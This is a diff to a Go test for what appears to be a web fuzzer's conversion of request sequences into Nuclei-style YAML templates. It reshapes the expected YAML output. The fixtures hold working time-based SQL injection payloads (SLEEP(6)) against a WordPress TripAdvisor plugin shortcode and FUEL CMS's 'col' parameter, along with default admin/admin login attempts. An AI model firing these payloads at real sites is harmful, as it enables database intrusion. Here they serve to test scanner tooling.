@@ -501,44 +501,31 @@ func TestGRPCMUSTPASS_WebFuzzerSequenceConvertYaml(t *testing.T) {
         condition: and
 `,
 			expect: `http:
-- raw:
-  - |-
-    POST /wp-login.php HTTP/1.1
-    Host: {{Hostname}}
-    Content-Type: application/x-www-form-urlencoded
-    Content-Length: 50
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
 
-    log={{username}}&pwd={{password}}&wp-submit=Log+In
+        log={{username}}&pwd={{password}}&wp-submit=Log+In
 
-  cookie-reuse: true
-  matchers:
-  - type: dsl
-    dsl:
-    - duration_2>=6
-    - status_code_2 == 200
-    - contains(content_type_2, "application/json")
-    - contains(body_2, "\"data\":{")
-    condition: and
+      - |
+        @timeout: 10s
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        content-type: application/x-www-form-urlencoded
 
-- raw:
-  - |-
-    @timeout: 10s
-    POST /wp-admin/admin-ajax.php HTTP/1.1
-    Host: {{Hostname}}
-    content-type: application/x-www-form-urlencoded
-    Content-Length: 115
+        action=parse-media-shortcode&shortcode=[wptripadvisor_usetemplate+tid="1+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b)"]
 
-    action=parse-media-shortcode&shortcode=[wptripadvisor_usetemplate+tid="1+AND+(SELECT+42+FROM+(SELECT(SLEEP(6)))b)"]
-
-  cookie-reuse: true
-  matchers:
-  - type: dsl
-    dsl:
-    - duration_2>=6
-    - status_code_2 == 200
-    - contains(content_type_2, "application/json")
-    - contains(body_2, "\"data\":{")
-    condition: and
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_2>=6'
+          - 'status_code_2 == 200'
+          - 'contains(content_type_2, "application/json")'
+          - 'contains(body_2, "\"data\":{")'
+        condition: and
 `,
 		},
 		{ // path请求，预期解析为raw请求，匹配器不变
@@ -658,78 +645,38 @@ func TestGRPCMUSTPASS_WebFuzzerSequenceConvertYaml(t *testing.T) {
           - 'contains(body_1, "FUEL CMS")'
         condition: and`,
 			expect: `http:
-- raw:
-  - |+
-    GET /fuel/login/ HTTP/1.1
-    Host: {{Hostname}}
+  - raw:
+      - |
+        GET /fuel/login/ HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /fuel/login/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: http://www.example.com
+        Content-Length: 65
 
+        user_name={{username}}&password={{password}}&Login=Login&forward=
+      - |
+        @timeout: 10s
+        GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Referer: http://www.example.com
 
-  payloads:
-    username:
-    - admin
-    password:
-    - admin
-  # attack: pitchfork
-
-  cookie-reuse: true
-  matchers:
-  - type: dsl
-    dsl:
-    - duration>=6
-    - status_code_3 == 200
-    - contains(body_1, "FUEL CMS")
-    condition: and
-
-- raw:
-  - |-
-    POST /fuel/login/ HTTP/1.1
-    Host: {{Hostname}}
-    Content-Type: application/x-www-form-urlencoded
-    Referer: http://www.example.com
-    Content-Length: 65
-
-    user_name={{username}}&password={{password}}&Login=Login&forward=
-
-  payloads:
-    username:
-    - admin
-    password:
-    - admin
-  # attack: pitchfork
-
-  cookie-reuse: true
-  matchers:
-  - type: dsl
-    dsl:
-    - duration>=6
-    - status_code_3 == 200
-    - contains(body_1, "FUEL CMS")
-    condition: and
-
-- raw:
-  - |+
-    @timeout: 10s
-    GET /fuel/pages/items/?search_term=&published=&layout=&limit=50&view_type=list&offset=0&order=asc&col=location+AND+(SELECT+1340+FROM+(SELECT(SLEEP(6)))ULQV)&fuel_inline=0 HTTP/1.1
-    Host: {{Hostname}}
-    X-Requested-With: XMLHttpRequest
-    Referer: http://www.example.com
-
-
-  payloads:
-    password:
-    - admin
-    username:
-    - admin
-  # attack: pitchfork
-
-  cookie-reuse: true
-  matchers:
-  - type: dsl
-    dsl:
-    - duration>=6
-    - status_code_3 == 200
-    - contains(body_1, "FUEL CMS")
-    condition: and
+    payloads:
+      username:
+        - admin
+      password:
+        - admin
+    cookie-reuse: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=6'
+          - 'status_code_3 == 200'
+          - 'contains(body_1, "FUEL CMS")'
+        condition: and
 `,
 		},
 	}
